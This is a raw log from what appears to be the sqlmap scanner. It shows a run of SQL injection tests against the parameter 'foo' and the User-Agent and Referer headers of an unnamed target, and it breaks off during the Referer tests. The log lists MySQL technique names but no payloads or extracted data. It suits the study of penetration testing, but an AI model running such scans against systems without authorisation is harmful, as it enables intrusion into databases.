[05:07:07] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:07:08] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:07:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:07:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:07:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[05:07:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[05:07:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[05:07:12] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[05:07:12] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[05:07:12] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[05:07:12] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[05:07:12] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[05:07:12] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[05:07:13] [INFO] testing 'Generic inline queries'
[05:07:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[05:07:13] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[05:07:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[05:07:14] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[05:07:15] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[05:07:15] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[05:07:16] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[05:07:17] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[05:07:18] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[05:07:18] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[05:07:19] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[05:07:19] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[05:07:19] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[05:07:19] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[05:07:19] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[05:07:19] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[05:07:19] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[05:07:19] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[05:07:19] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[05:07:19] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[05:07:19] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[05:07:20] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[05:07:20] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:07:20] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[05:07:21] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[05:07:21] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[05:07:21] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[05:07:22] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[05:07:22] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[05:07:22] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[05:07:23] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:07:23] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:07:23] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[05:07:24] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[05:07:24] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[05:07:24] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[05:07:25] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:07:25] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[05:07:25] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[05:07:26] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:07:26] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[05:07:26] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[05:07:26] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[05:07:26] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[05:07:26] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[05:07:26] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[05:07:26] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[05:07:26] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[05:07:26] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[05:07:26] [INFO] testing 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)'
[05:07:26] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[05:07:26] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[05:07:26] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[05:07:26] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[05:07:26] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[05:07:26] [INFO] testing 'MySQL inline queries'
[05:07:26] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:07:26] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:07:26] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:07:27] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:07:27] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:07:27] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:07:27] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:07:27] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[05:07:28] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[05:07:28] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[05:07:28] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[05:07:28] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[05:07:28] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[05:07:29] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[05:07:29] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[05:07:29] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
[05:07:29] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
[05:07:30] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
[05:07:30] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
[05:07:30] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
[05:07:30] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
[05:07:30] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
[05:07:30] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[05:07:31] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[05:07:31] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[05:07:31] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[05:07:31] [INFO] testing 'MySQL AND time-based blind (ELT)'
[05:07:32] [INFO] testing 'MySQL OR time-based blind (ELT)'
[05:07:32] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[05:07:32] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[05:07:32] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:07:32] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:07:32] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[05:07:32] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[05:07:32] [INFO] testing 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)'
[05:07:32] [INFO] testing 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)'
[05:07:33] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
[05:07:33] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
[05:07:33] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
[05:07:33] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
[05:07:33] [INFO] testing 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[05:07:33] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[05:07:33] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[05:07:34] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[05:07:34] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[05:07:34] [WARNING] GET parameter 'foo' does not seem to be injectable
[05:07:34] [INFO] testing if parameter 'User-Agent' is dynamic
[05:07:34] [WARNING] parameter 'User-Agent' does not appear to be dynamic
[05:07:34] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
[05:07:34] [INFO] testing for SQL injection on parameter 'User-Agent'
[05:07:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:07:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:07:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:07:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:07:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:07:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[05:07:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[05:07:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[05:07:39] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[05:07:39] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[05:07:39] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[05:07:39] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[05:07:39] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[05:07:39] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[05:07:40] [INFO] testing 'Generic inline queries'
[05:07:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[05:07:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[05:07:41] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[05:07:41] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[05:07:42] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[05:07:42] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[05:07:43] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[05:07:44] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[05:07:44] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[05:07:45] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[05:07:46] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[05:07:46] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[05:07:46] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[05:07:46] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[05:07:46] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[05:07:46] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[05:07:46] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[05:07:46] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[05:07:46] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[05:07:46] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[05:07:46] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[05:07:46] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[05:07:46] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:07:47] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[05:07:47] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[05:07:47] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[05:07:48] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[05:07:48] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[05:07:48] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[05:07:49] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[05:07:49] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:07:49] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:07:50] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[05:07:50] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[05:07:50] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[05:07:51] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[05:07:51] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:07:51] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[05:07:52] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[05:07:52] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:07:52] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[05:07:52] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[05:07:52] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[05:07:52] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[05:07:52] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[05:07:52] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[05:07:52] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[05:07:52] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[05:07:52] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[05:07:52] [INFO] testing 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)'
[05:07:52] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[05:07:52] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[05:07:52] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[05:07:52] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[05:07:52] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[05:07:52] [INFO] testing 'MySQL inline queries'
[05:07:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:07:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:07:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:07:53] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:07:53] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:07:53] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:07:53] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:07:53] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[05:07:54] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[05:07:54] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[05:07:54] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[05:07:54] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[05:07:54] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[05:07:54] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[05:07:55] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[05:07:55] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
[05:07:55] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
[05:07:55] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
[05:07:56] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
[05:07:56] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
[05:07:56] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
[05:07:56] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
[05:07:56] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[05:07:56] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[05:07:57] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[05:07:57] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[05:07:57] [INFO] testing 'MySQL AND time-based blind (ELT)'
[05:07:57] [INFO] testing 'MySQL OR time-based blind (ELT)'
[05:07:58] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[05:07:58] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[05:07:58] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:07:58] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:07:58] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[05:07:58] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[05:07:58] [INFO] testing 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)'
[05:07:58] [INFO] testing 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)'
[05:07:58] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
[05:07:58] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
[05:07:58] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
[05:07:58] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
[05:07:58] [INFO] testing 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)'
[05:07:58] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[05:07:59] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[05:07:59] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[05:08:00] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[05:08:00] [WARNING] parameter 'User-Agent' does not seem to be injectable
[05:08:00] [INFO] testing if parameter 'Referer' is dynamic
[05:08:00] [WARNING] parameter 'Referer' does not appear to be dynamic
[05:08:00] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
[05:08:00] [INFO] testing for SQL injection on parameter 'Referer'
[05:08:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:08:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:08:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:08:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:08:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:08:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[05:08:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[05:08:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[05:08:03] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[05:08:03] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[05:08:03] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[05:08:03] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[05:08:03] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[05:08:03] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[05:08:03] [INFO] testing 'Generic inline queries'
[05:08:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[05:08:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[05:08:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[05:08:04] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[05:08:04] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[05:08:04] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[05:08:05] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[05:08:05] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[05:08:05] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[05:08:06] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[05:08:06] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[05:08:06] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[05:08:06] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[05:08:06] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[05:08:06] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[05:08:06] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[05:08:06] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[05:08:06] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[05:08:06] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[05:08:06] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[05:08:06] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[05:08:06] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[05:08:06] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:08:07] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[05:08:07] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[05:08:07] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[05:08:07] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[05:08:07] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[05:08:07] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[05:08:08] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[05:08:08] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:08:08] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:08:08] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[05:08:08] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[05:08:09] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[05:08:09] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[05:08:09] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:08:09] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[05:08:09] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[05:08:09] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:08:09] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[05:08:09] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
